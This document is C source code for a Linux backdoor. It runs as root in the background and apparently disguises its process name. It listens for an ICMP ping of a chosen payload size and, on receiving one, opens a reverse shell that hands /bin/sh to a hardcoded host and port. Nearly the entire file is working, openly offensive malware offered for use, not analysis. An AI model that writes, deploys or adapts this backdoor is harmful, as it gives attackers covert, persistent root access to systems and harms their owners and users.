/* 
 * Linux backdoor using ping technique
 * Coded by jamez - jamez#sekure.org (Sep 13, 1998)
 * Reverse shell functionality added by Mihai Sbirneciu - mihai.sbirneciu#gmail.com (Nov 17, 2014)
 * Special thanks for Alexander G. for bringing this gem to my attention.
 * You must run the backdoor as root to be able to sniff ICMP:    
 *  ./backdoor packet_size
 *                  |
 *                  `-> ICMP payload size required to activate the backdoor 
 *  
 *  To activate the backdoor: ping host -s packet_size
 *  
 * http://www.sekure.org
 * http://speknet.tumblr.com/
 * 
 *
 */

#include <signal.h>
#include <netinet/ip.h>
#include <netdb.h>
#define NULL 0
#define REVERSE_HOST "192.168.56.1"
#define REVERSE_PORT 3320
#define MOTD  "Hello Master\n\n# "

int SIZEPACK;
void start_reverse_shell()
{
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    chdir("/");
    int sockfd = 0, n = 0;
    struct sockaddr_in serv_addr;
    if((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0)
    {
        return 1;
    }
    memset(&serv_addr, '0', sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(REVERSE_PORT);
    if(inet_pton(AF_INET, REVERSE_HOST, &serv_addr.sin_addr)<=0)
    {
        return 1;
    }
    if( connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0)
    {
        return 1;
    }
    /* motd */
    write(sockfd, MOTD, strlen(MOTD));
    /* connect the socket to process sdout,stdin and stderr */
    dup2(sockfd, 0);
    dup2(sockfd, 1);
    dup2(sockfd, 2);
    /* running the shell */
    execl("/bin/sh","sh",(char *)0);
    close(sockfd);
    exit(0);
}
void child_kill()
{
    wait(NULL);
    signal(SIGCHLD, child_kill);
}
int main(int argc, char *argv[])
{
    int s, size, fromlen;
    char pkt[4096];
    struct protoent *proto;
    struct sockaddr_in from;
    if(argc < 2) {
        printf("usage: %s packet_size\n", argv[0]);
        exit(0);
    }
    SIZEPACK = atoi(argv[1]);
    strcpy(argv[0], (char *)strcat(argv[0], "  "));
    signal(SIGHUP,SIG_IGN);
    signal(SIGCHLD, child_kill);
    if (fork() != 0) exit(0);
    proto = getprotobyname("icmp");
    if ((s = socket(AF_INET, SOCK_RAW, proto->p_proto)) < 0)
    /* can't creat raw socket */
    exit(0);
    /* waiting for packets */
    while(1)
    {
        do
        {
            fromlen = sizeof(from);
            if ((size = recvfrom(s, pkt, sizeof(pkt), 0, (struct sockaddr *) &from, &fromlen)) < 0)
            printf("ping of %i\n", size-28);
        } while (size != SIZEPACK + 28);
        switch(fork()){
            case -1:
            continue;
            case 0:
            start_reverse_shell();
            exit(0);
        }
        sleep(15);
    }
}